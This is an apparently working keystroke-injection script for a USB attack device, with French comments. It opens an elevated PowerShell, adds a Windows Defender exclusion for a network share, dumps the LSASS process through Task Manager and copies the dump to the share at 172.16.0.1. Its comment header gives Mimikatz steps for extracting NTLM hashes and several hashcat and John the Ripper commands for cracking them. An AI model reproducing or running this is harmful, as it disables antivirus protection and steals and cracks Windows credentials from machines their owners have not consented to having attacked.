// @_Extract_lsaasDMP_toSMB_V2_Infinition
// MIMIKATZ:
//
//sekurlsa::minidump \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\lsass.DMP
//sekurlsa::logonPasswords
//
//Copier le Hash NTLM
//
//
// Brute-Force with GeForce GTX 
// HASHCAT:
// Exemple pour le mot de passe 7 caractères : ub8n7s_
// .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI2\hash.txt --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 1 --increment-max 8 -1 ?l?d?s ?1?1?1?1?1?1?1?1?1
// ou
// .\hashcat.exe --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 1 --increment-max 8 -1 ?l?d?s e6242be3a16b0932366721742f4afc3d ?1?1?1?1?1?1?1?1?1
// --force signifie ignorer les avertissements
// --hwmon-temp-abort=100 signifie définir la température maximale, après laquelle l'attaque de force brute sera interrompue, de 100 degrés Celsius
// -m 1000 signifie le type de hachage NTLM
// -D 1,2 signifie utiliser à la fois le processeur central et la carte vidéo pour la force brute
// -a 3 signifie attaque au masque
// -i signifie augmenter progressivement le nombre de caractères dans les mots de passe générés
// --increment-min 1 signifie commencer avec une longueur de masque égale à un
// --increment-max 10 signifie terminer la recherche avec une longueur de masque de dix
// -1? L? D signifie le jeu de caractères personnalisé numéro 1, il comprend les petites lettres latines (? L) et les chiffres (? D)
// ca76a276340f0291e1cc8ea7277fc571 est le hachage à cracker
// ? 1? 1? 1? 1? 1? 1? 1? 1? 1 est un masque d'un jeu de caractères personnalisé
//
//
//     ?l = abcdefghijklmnopqrstuvwxyz
//     ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
//     ?d = 0123456789
//     ?h = 0123456789abcdef
//     ?H = 0123456789ABCDEF
//     ?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
//     ?a = ?l?u?d?s
//     ?b = 0x00 - 0xff
//     Ci-dessous le masque particulier tentera de forcer un mot de passe à 8 caractères :
//     
//     où le premier caractère (? U) est une lettre majuscule,
//     les trois caractères suivants (? L? L? L) sont des lettres minuscules
//     et les quatre derniers caractères (? D? d? d? d) sont des chiffres
//     hashcat64.exe -a 3 -m 0 example_md5_hashes.txt ?u?l?l?l?d?d?d?d
//
//                                  
// cd \\172.16.0.1\Data\hashcat-6.1.1
// 
//  .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -m 1000 -a3 ?l?l?l?l?d?d
// .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -w4 -O -m 1000 -a3 ?u?l?l?l?l?l?l?l?d?d
// .\hashcat.exe \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt -w4 -O -m 1000 -a3 ?u?l?l?l?l?l?l?l?d?d?d?d
//
// OTHER=
// ?a?a?a?a?a?a?a?a?a?a?a?a?a?a --increment-min 14 --increment-max 16.
//
// -> For usual symbols: (!_-,.:;/).
// hashcat -1 '?l?d!_-,.:;/' ?1?1?1?1?1?1?1?1?1?1?1?1?1?1
// 
// Brute-Force with Raspberry Pi  (John the Ripper)
// .\john.exe -mask=?l?l?l?l?l?l?d?d --format=NT \\172.16.0.1\Data\dump_DESKTOP-T5BTUQI\hash.txt
layout('fr')
typingSpeed(0,0)
press("GUI r")
delay(200)
type("powershell")
press("CTRL SHIFT ENTER")
delay(1000)
press("SHIFT TAB")
press("ENTER")
delay(3000)
type('Add-MpPreference -ExclusionPath “\\\\172.16.0.1\\Data”\n')
delay(200)
press("ALT F4")
delay(2500)
press("GUI r")
delay(1000)
type ('taskmgr')
delay(500)
press("CTRL SHIFT ENTER")
delay(2500)
press ("ALT y")
delay(2500)
press ("DOWN")
delay(200)
type('local')
delay(200)
press ("SHIFT F10")
delay(1200)
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("DOWN")
press ("ENTER")
delay(3500)
press ("ENTER")
press ("ALT F4")
delay(700)
press("GUI r")
delay(700)
type('powershell -ep bypass /w 1 /C $t=$env:temp;$l=\'lsass.DMP\';compress-archive -path $t\\$l -destinationpath \\\\172.16.0.1\\Data\\dump_$Env:ComputerName.zip\n')
type('\n')
delay(200)
press ("ENTER")